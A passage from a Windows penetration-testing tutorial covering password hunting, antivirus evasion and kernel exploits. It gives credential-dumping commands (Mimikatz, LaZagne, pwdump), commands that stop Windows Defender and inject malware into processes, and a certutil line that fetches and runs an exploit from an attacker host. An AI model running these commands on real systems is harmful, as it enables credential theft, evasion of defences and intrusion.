Advanced Password Hunting Techniques:

    Using Mimikatz to Extract Credentials:
        Dumping Credentials: Mimikatz can be used to extract plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory.

        bash

    mimikatz # sekurlsa::logonPasswords

        Explanation: Mimikatz is a powerful post-exploitation tool that can dump credentials from memory, allowing attackers to gather login information that can be used to escalate privileges or move laterally within the network.

Using LaZagne to Find Passwords:

    LaZagne: An open-source tool that retrieves stored passwords on a system.

    bash

    lazagne.exe all

        Explanation: LaZagne specializes in extracting credentials from various applications and services, including browsers, email clients, databases, and more.

Credential Dumping with PwDump or Quarks PwDump:

    quarks-pwdump.exe: Extracts password hashes from the SAM database.

    bash

        quarks-pwdump.exe

            Explanation: These tools are used to dump password hashes from the Security Account Manager (SAM) database, which can then be cracked offline to reveal plaintext passwords.

Methodology and Tactics:
Password hunting is often a crucial part of the post-exploitation phase. Advanced tools like Mimikatz and LaZagne allow attackers to retrieve credentials that are not immediately visible, enabling further exploitation and movement within the target environment.
19. AV Enumeration

Advanced Techniques and Bypass Methods:

    Evading Detection with Obfuscation:
        Obfuscating Payloads: Tools like Veil or Shellter can be used to create obfuscated payloads that evade antivirus detection.

        bash

    veil-evasion

        Explanation: Obfuscation tools modify the signature of malicious payloads to avoid detection by antivirus software. This is essential for executing attacks without triggering alarms.

Process Injection Techniques:

    Invoke-ReflectivePEInjection: A PowerShell script that injects a PE (Portable Executable) into the memory of a running process, bypassing file-based AV checks.

    powershell

    Invoke-ReflectivePEInjection -PEPath "C:\path\to\malware.exe" -ProcID <PID>

        Explanation: Process injection techniques involve injecting malicious code into the memory space of a legitimate process, making it harder for AV software to detect and block the attack.

Disabling AV Temporarily:

    net stop <service name>: Stops a specific antivirus service, although this action is often restricted by admin privileges.

    bash

        net stop windefend

            Explanation: Temporarily disabling antivirus services can allow the execution of malicious payloads, though this is typically detected and blocked by modern AV solutions. Use with caution and in specific scenarios where the AV configuration is weak.

Methodology and Tactics:
Antivirus enumeration and evasion are critical when conducting advanced penetration tests or red team exercises. Understanding how AV products work, how they detect threats, and how to circumvent them is essential for maintaining stealth during an engagement.
20. Kernel Exploits

Advanced Kernel Exploitation Techniques:

    Exploiting Vulnerable Drivers:
        Driver Exploits: Identifying and exploiting vulnerabilities in kernel-mode drivers can provide attackers with SYSTEM-level access.
            Example: Exploiting the MS15-051 vulnerability, which involves a race condition in the win32k.sys driver.

            bash

        windows-exploit-suggester.py --database 2020-04-17-mssb.xls --sysinfo sysinfo.txt

            Explanation: Tools like Windows Exploit Suggester can help identify potential kernel vulnerabilities based on the system’s patch level, which can then be exploited using available public exploits.

Custom Kernel Exploit Development:

    Developing Custom Exploits: Advanced attackers may develop custom exploits tailored to specific kernel vulnerabilities. This involves understanding the kernel architecture, reverse engineering, and crafting shellcode.
        Example: Creating a custom exploit for MS14-058, a known vulnerability in the Windows kernel.

Using Chimichurri Exploit for Remote Shell Access:

    MS10-059 Chimichurri: A well-known exploit that provides a remote shell as SYSTEM on vulnerable Windows systems.

    bash

        certutil -urlcache -f http://<attacker-ip>/chimichurri.exe chimichurri.exe
        chimichurri.exe

            Explanation: The Chimichurri exploit leverages a vulnerability in Windows systems to gain remote SYSTEM-level access, providing a foothold for further exploitation.

Methodology and Tactics:
Kernel exploits are some of the most powerful tools in an attacker’s arsenal, providing the highest level of access on a system. Successful kernel exploitation requires deep knowledge of operating system internals and careful exploitation to avoid crashing the target system.

This extended content provides a more in-depth exploration of each section, adding advanced techniques, alternative tools, and detailed methodologies. By incorporating these details, the tutorial becomes a comprehensive guide for both novice and experienced security professionals, offering insights into how to effectively execute and understand each phase of a penetration test or red team operation.
